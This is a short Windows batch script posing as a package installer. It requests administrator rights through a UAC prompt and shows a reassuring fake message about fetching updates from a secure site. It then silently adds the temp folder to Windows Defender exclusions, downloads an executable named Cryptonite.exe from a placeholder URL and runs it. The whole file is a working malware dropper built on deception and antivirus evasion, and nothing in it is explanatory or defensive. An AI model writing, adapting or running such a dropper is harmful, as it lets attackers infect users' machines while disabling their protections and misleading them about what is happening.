@echo off

title Installing Packages 

net session >nul 2>&1

set url=FULL_URL_WHERE_CRYPTONITE.EXE_IS_HOSTED

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
set params = %*:"="
echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:gotAdmin
echo msgbox "Fetching updates from secure site. Don't worry! The window will be closed after installation." > %tmp%\tmp.vbs
wscript %tmp%\tmp.vbs
del %tmp%\tmp.vbs

cd %temp%

powershell -Command Add-MpPreference -ExclusionPath "%temp%" -ErrorAction SilentlyContinue

powershell -Command start-bitstransfer %url%  .\Cryptonite.exe

start Cryptonite.exe
